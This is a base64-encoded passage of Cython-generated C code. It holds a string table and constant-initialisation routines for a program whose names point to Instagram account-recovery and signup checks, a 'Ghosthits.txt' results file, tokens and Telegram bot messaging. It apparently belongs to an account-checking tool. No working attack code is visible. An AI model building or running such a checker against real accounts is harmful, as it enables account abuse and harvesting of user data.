hfa19yZWZlcmVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlZmVycmVyX2hlYWRlciwgc2l6ZW9mKF9fcHl4X2tfcmVmZXJyZXJfaGVhZGVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlZ19kYXRlLCBzaXplb2YoX19weXhfa19yZWdfZGF0ZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZW5kZXIsIHNpemVvZihfX3B5eF9rX3JlbmRlciksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZW5kZXJfc3VyZmFjZSwgc2l6ZW9mKF9fcHl4X2tfcmVuZGVyX3N1cmZhY2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVwbHlfbWFya3VwLCBzaXplb2YoX19weXhfa19yZXBseV9tYXJrdXApLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVxdWVzdHMsIHNpemVvZihfX3B5eF9rX3JlcXVlc3RzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlczEsIHNpemVvZihfX3B5eF9rX3JlczEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVzcG9uc2UsIHNpemVvZihfX3B5eF9rX3Jlc3BvbnNlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Jlc3QsIHNpemVvZihfX3B5eF9rX3Jlc3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVzdF9lcnJvcl9pbl9mdW5jdGlvbiwgc2l6ZW9mKF9fcHl4X2tfcmVzdF9lcnJvcl9pbl9mdW5jdGlvbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19zYXksIHNpemVvZihfX3B5eF9rX3NheSksIDAsIDEsIDF9LCAKICB7X19weXhfa19zZWFyY2gsIHNpemVvZihfX3B5eF9rX3NlYXJjaCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zZW5kLCBzaXplb2YoX19weXhfa19zZW5kKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NlbmRNZXNzYWdlLCBzaXplb2YoX19weXhfa19zZW5kTWVzc2FnZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZXNzaW9uLCBzaXplb2YoX19weXhfa19zZXNzaW9uKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NldF9uYW1lLCBzaXplb2YoX19weXhfa19zZXRfbmFtZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19zaWduZWRfYm9keSwgc2l6ZW9mKF9fcHl4X2tfc2lnbmVkX2JvZHkpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2lnbmluX3YyX3VzZXJuYW1lcmVjb3ZlcnlfZmxvdywgc2l6ZW9mKF9fcHl4X2tfc2lnbmluX3YyX3VzZXJuYW1lcmVjb3ZlcnlfZmxvdyksIDAsIDEsIDB9LCAKICB7X19weXhfa19zaWdudXBfdXNlcm5hbWVhdmFpbGFiaWxpdHksIHNpemVvZihfX3B5eF9rX3NpZ251cF91c2VybmFtZWF2YWlsYWJpbGl0eSksIDAsIDEsIDB9LCAKICB7X19weXhfa19zaWdudXBfdmFsaWRhdGVwZXJzb25hbGRldGFpbCwgc2l6ZW9mKF9fcHl4X2tfc2lnbnVwX3ZhbGlkYXRlcGVyc29uYWxkZXRhaWwpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfc2xlZXAsIHNpemVvZihfX3B5eF9rX3NsZWVwKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwYWNlLCBzaXplb2YoX19weXhfa19zcGFjZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19zcGVjLCBzaXplb2YoX19weXhfa19zcGVjKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwbGl0LCBzaXplb2YoX19weXhfa19zcGxpdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zcGxpdGxpbmVzLCBzaXplb2YoX19weXhfa19zcGxpdGxpbmVzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0YXJ0LCBzaXplb2YoX19weXhfa19zdGFydCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zdGF0c19saW5lLCBzaXplb2YoX19weXhfa19zdGF0c19saW5lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0YXRzX2xvb3AsIHNpemVvZihfX3B5eF9rX3N0YXRzX2xvb3ApLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3Rkb3V0LCBzaXplb2YoX19weXhfa19zdGRvdXQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3RyaW5nLCBzaXplb2YoX19weXhfa19zdHJpbmcpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3VicHJvY2Vzcywgc2l6ZW9mKF9fcHl4X2tfc3VicHJvY2VzcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19zeXMsIHNpemVvZihfX3B5eF9rX3N5cyksIDAsIDEsIDF9LCAKICB7X19weXhfa19zeXN0ZW0sIHNpemVvZihfX3B5eF9rX3N5c3RlbSksIDAsIDEsIDF9LCAKICB7X19weXhfa190YXJnZXQsIHNpemVvZihfX3B5eF9rX3RhcmdldCksIDAsIDEsIDF9LCAKICB7X19weXhfa190ZXN0LCBzaXplb2YoX19weXhfa190ZXN0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RleHQsIHNpemVvZihfX3B5eF9rX3RleHQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGhyZWFkaW5nLCBzaXplb2YoX19weXhfa190aHJlYWRpbmcpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGhyb3csIHNpemVvZihfX3B5eF9rX3Rocm93KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RpbWUsIHNpemVvZihfX3B5eF9rX3RpbWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGluZm8sIHNpemVvZihfX3B5eF9rX3RpbmZvKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RsLCBzaXplb2YoX19weXhfa190bCksIDAsIDEsIDF9LCAKICB7X19weXhfa190bF90eHQsIHNpemVvZihfX3B5eF9rX3RsX3R4dCksIDAsIDEsIDB9LCAKICB7X19weXhfa190bG4sIHNpemVvZihfX3B5eF9rX3RsbiksIDAsIDEsIDF9LCAKICB7X19weXhfa190b2ssIHNpemVvZihfX3B5eF9rX3RvayksIDAsIDEsIDF9LCAKICB7X19weXhfa190b2tlbl9kYXRhLCBzaXplb2YoX19weXhfa190b2tlbl9kYXRhKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Rva2VuX2ZpbGUsIHNpemVvZihfX3B5eF9rX3Rva2VuX2ZpbGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdG9rZW5fbGluZSwgc2l6ZW9mKF9fcHl4X2tfdG9rZW5fbGluZSksIDAsIDEsIDF9LCAKICB7X19weXhfa190b3RhbF9oaXRzLCBzaXplb2YoX19weXhfa190b3RhbF9oaXRzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VhLCBzaXplb2YoX19weXhfa191YSksIDAsIDEsIDF9LCAKICB7X19weXhfa191cGRhdGVfc3RhdHMsIHNpemVvZihfX3B5eF9rX3VwZGF0ZV9zdGF0cyksIDAsIDEsIDF9LCAKICB7X19weXhfa191cmwsIHNpemVvZihfX3B5eF9rX3VybCksIDAsIDEsIDF9LCAKICB7X19weXhfa191c2VyLCBzaXplb2YoX19weXhfa191c2VyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXJfYWdlbnQsIHNpemVvZihfX3B5eF9rX3VzZXJfYWdlbnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdXNlcl9hZ2VudF9oZWFkZXIsIHNpemVvZihfX3B5eF9rX3VzZXJfYWdlbnRfaGVhZGVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXJfaWQsIHNpemVvZihfX3B5eF9rX3VzZXJfaWQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdXNlcl9pZF9pbnQsIHNpemVvZihfX3B5eF9rX3VzZXJfaWRfaW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXJuYW1lLCBzaXplb2YoX19weXhfa191c2VybmFtZSksIDAsIDEsIDF9LCAKICB7X19weXhfa191dWksIHNpemVvZihfX3B5eF9rX3V1aSksIDAsIDEsIDF9LCAKICB7X19weXhfa191dWlkLCBzaXplb2YoX19weXhfa191dWlkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3V1aWQ0LCBzaXplb2YoX19weXhfa191dWlkNCksIDAsIDEsIDF9LCAKICB7X19weXhfa192YWx1ZSwgc2l6ZW9mKF9fcHl4X2tfdmFsdWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdmFyaWFibGVzLCBzaXplb2YoX19weXhfa192YXJpYWJsZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdywgc2l6ZW9mKF9fcHl4X2tfdyksIDAsIDEsIDF9LCAKICB7X19weXhfa193aGl0ZSwgc2l6ZW9mKF9fcHl4X2tfd2hpdGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfd3JpdGUsIHNpemVvZihfX3B5eF9rX3dyaXRlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3llbCwgc2l6ZW9mKF9fcHl4X2tfeWVsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3llbDEsIHNpemVvZihfX3B5eF9rX3llbDEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfeWVsMiwgc2l6ZW9mKF9fcHl4X2tfeWVsMiksIDAsIDEsIDF9LCAKICB7X19weXhfa195ZWwzLCBzaXplb2YoX19weXhfa195ZWwzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3llbDQsIHNpemVvZihfX3B5eF9rX3llbDQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfeWVsNSwgc2l6ZW9mKF9fcHl4X2tfeWVsNSksIDAsIDEsIDF9LCAKICB7MCwgMCwgMCwgMCwgMH0KfTsKCnN0YXRpYyBpbnQgX19QeXhfSW5pdFN0cmluZ3MoX19QeXhfU3RyaW5nVGFiRW50cnkgY29uc3QgKnQsIFB5T2JqZWN0ICoqdGFyZ2V0LCBjb25zdCBjaGFyKiBjb25zdCogZW5jb2RpbmdfbmFtZXMpOwoKCgpzdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRCdWlsdGlucyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fcHl4X2J1aWx0aW5fcHJpbnQgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcmludCk7IGlmICghX19weXhfYnVpbHRpbl9wcmludCkgX19QWVhfRVJSKDAsIDgxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9idWlsdGluX2lucHV0ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaW5wdXQpOyBpZiAoIV9fcHl4X2J1aWx0aW5faW5wdXQpIF9fUFlYX0VSUigwLCAxMDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X2J1aWx0aW5fcmFuZ2UgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yYW5nZSk7IGlmICghX19weXhfYnVpbHRpbl9yYW5nZSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfYnVpbHRpbl9vcGVuID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb3Blbik7IGlmICghX19weXhfYnVpbHRpbl9vcGVuKSBfX1BZWF9FUlIoMCwgMTY2LCBfX3B5eF9MMV9lcnJvcikKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyIsIDApOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKSkgX19QWVhfRVJSKDAsIDEyNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF85KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzMwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdID0gUHlUdXBsZV9QYWNrKDMsIFB5X05vbmUsIFB5X05vbmUsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0gPSBQeVNsaWNlX05ldyhQeV9Ob25lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTYsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdKSkgX19QWVhfRVJSKDAsIDIyMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X25vX3Jlc2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSkpIF9fUFlYX0VSUigwLCAyOTIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9waywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdKSkgX19QWVhfRVJSKDAsIDMwMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZvbGxvd2VyX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0pKSBfX1BZWF9FUlIoMCwgMzM4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs3XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZm9sbG93aW5nX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pKSBfX1BZWF9FUlIoMCwgMzQ2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0dob3N0aGl0c190eHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSkpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNjI5MDEwMDAxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNTc0NjQ3MDcwODMpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldKSkgX19QWVhfRVJSKDAsIDM5OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19weXhfbXN0YXRlLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcC50eXBlID0gKFB5T2JqZWN0KikmUHlEaWN0X1R5cGU7CiAgX19weXhfbXN0YXRlLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcC5tZXRob2RfbmFtZSA9ICZfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wb3A7CiAgaWYgKF9fUHl4X0luaXRTdHJpbmdzKF9fcHl4X3N0cmluZ190YWIsIF9fcHl4X21zdGF0ZS0+X19weXhfc3RyaW5nX3RhYiwgX19weXhfc3RyaW5nX3RhYl9lbmNvZGluZ3MpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2Zsb2F0XzBfMDIwMCA9IFB5RmxvYXRfRnJvbURvdWJsZSgwLjAyMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZmxvYXRfMF8wMjAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzAgPSBQeUxvbmdfRnJvbUxvbmcoMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xID0gUHlMb25nX0Zyb21Mb25nKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMiA9IFB5TG9uZ19Gcm9tTG9uZygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMgPSBQeUxvbmdfRnJvbUxvbmcoMyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF82ID0gUHlMb25nX0Zyb21Mb25nKDYpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzYpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOSA9IFB5TG9uZ19Gcm9tTG9uZyg5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1ID0gUHlMb25nX0Zyb21Mb25nKDE1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNiA9IFB5TG9uZ19Gcm9tTG9uZygxNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMzAgPSBQeUxvbmdfRnJvbUxvbmcoMzApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMyID0gUHlMb25nX0Zyb21Mb25nKDMyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zMikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF80MCA9IFB5TG9uZ19Gcm9tTG9uZyg0MCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMCA9IFB5TG9uZ19Gcm9tTG9uZygyMDEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTEgPSBQeUxvbmdfRnJvbUxvbmcoMjAxMSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEyID0gUHlMb25nX0Zyb21Mb25nKDIwMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTIpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMyA9IFB5TG9uZ19Gcm9tTG9uZygyMDEzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTQgPSBQeUxvbmdfRnJvbUxvbmcoMjAxNCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE1ID0gUHlMb25nX0Zyb21Mb25nKDIwMTUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNiA9IFB5TG9uZ19Gcm9tTG9uZygyMDE2KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTcgPSBQeUxvbmdfRnJvbUxvbmcoMjAxNyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE4ID0gUHlMb25nX0Zyb21Mb25nKDIwMTgpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTgpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpC